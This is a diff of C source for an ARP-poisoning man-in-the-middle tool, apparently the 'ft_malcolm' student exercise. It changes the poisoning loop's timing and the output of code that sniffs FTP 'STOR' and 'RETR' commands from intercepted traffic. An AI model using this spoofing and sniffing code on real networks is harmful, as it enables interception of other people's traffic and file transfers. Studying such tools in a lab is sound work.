@@ -5,7 +5,6 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <time.h>
 #include <netinet/tcp.h>
 #include <net/if.h>
 #include <linux/if_ether.h>
@@ -235,9 +234,9 @@ static void snoop_payload(unsigned char *buffer, struct iphdr *ip, ssize_t bytes
 			if (payload_size > 0)
 			{
 				if (ft_memmem(payload, payload_size, "STOR ", 5))
-					printf("\033[1;31m[FT_MALCOLM] DETECTADO 'PUT': %.*s\033[0m \n", payload_size, payload);
+					printf("\033[1;31m[FT_MALCOLM] DETECTADO 'PUT': %.*s\033[0m", payload_size, payload);
 				else if (ft_memmem(payload, payload_size, "RETR ", 5))
-					printf("\033[1;34m[FT_MALCOLM] DETECTADO 'GET': %.*s\033[0m \n", payload_size, payload);
+					printf("\033[1;34m[FT_MALCOLM] DETECTADO 'GET': %.*s\033[0m", payload_size, payload);
 			}
 }
 
@@ -246,7 +245,6 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 	struct arp_packet router_packet;
 	struct arp_packet victim_packet;
 	t_session router_session;
-	time_t last_poison = 0;
 	unsigned char buffer[2048];
 
 	//t_session router_session;
@@ -257,10 +255,10 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 	ft_memcpy(router_session.dst.mac, access_point.mac, 6);
 	printf("Starting poisoning \n");
 
+	int seconds_counter = 2;
 	while(loop)
 	{
-		time_t now = time(NULL);
-		if (now - last_poison >= 2)
+		if (seconds_counter >= 2)
 		{
 			//POISON VICTIM 
 			//session -> src -> ip victim  
@@ -277,12 +275,16 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 			//router_session -> dst -> mac victim 
 			fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
 			send_data(sock, index, &router_packet, sizeof(struct arp_packet), session.dst.mac);
-			last_poison = now;
+			seconds_counter = 0;
 		}
 
 		ssize_t bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
 		struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
-
+		if (bytes < 0)
+        {
+            seconds_counter += 1;
+            continue;
+        }
 		if (ip->protocol == IPPROTO_TCP) 
 			snoop_payload(buffer, ip, bytes);
 		forwarding(sock, index, buffer, bytes, session, access_point);
